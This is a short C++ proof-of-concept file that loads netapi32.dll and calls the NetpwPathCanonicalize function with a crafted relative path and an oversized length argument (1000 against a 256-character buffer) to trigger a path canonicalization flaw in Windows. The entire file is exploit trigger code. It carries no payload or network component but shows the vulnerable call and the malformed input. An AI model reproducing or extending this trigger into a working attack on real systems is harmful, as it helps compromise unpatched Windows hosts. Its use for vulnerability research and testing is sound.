// poc.cpp

#include <windows.h>
#include <iostream>
#include <string.h>

typedef int (__stdcall *NetpwPathCanonicalize) (
    LPWSTR,
    LPWSTR,
    DWORD,
    LPWSTR,
    LPDWORD,
    DWORD
);

int main(int argc, char* argv[])
{
    WCHAR szPath[256];
    WCHAR szCanPath[256];
    DWORD nType = 1000;
    int nRetVal = 0;

    HMODULE hModule = LoadLibrary("netapi32.dll");
    NetpwPathCanonicalize pModule = NULL;

    if (NULL == hModule || INVALID_HANDLE_VALUE == hModule)
    {
        wprintf(L"Failed to load library.\n");
        return -1;
    }

    pModule = (NetpwPathCanonicalize)GetProcAddress(hModule, "NetpwPathCanonicalize");
    if (NULL == pModule || INVALID_HANDLE_VALUE == pModule)
    {
        FreeLibrary(hModule);
        wprintf(L"Fail to get API handle.\n");
        return -1;
    }

    szPath[0] = 0;
    wcscpy(szPath, L"\\aaa\\...\\..\\bbbb");

    szCanPath[0] = 0;
    nType = 1000;
    wprintf(L"Before: %s\n", szPath);

    nRetVal = (pModule)(szPath, szCanPath, 1000, NULL, &nType, 1);

    wprintf(L"After: %s\n", szCanPath);

    FreeLibrary(hModule);

    return 0;
}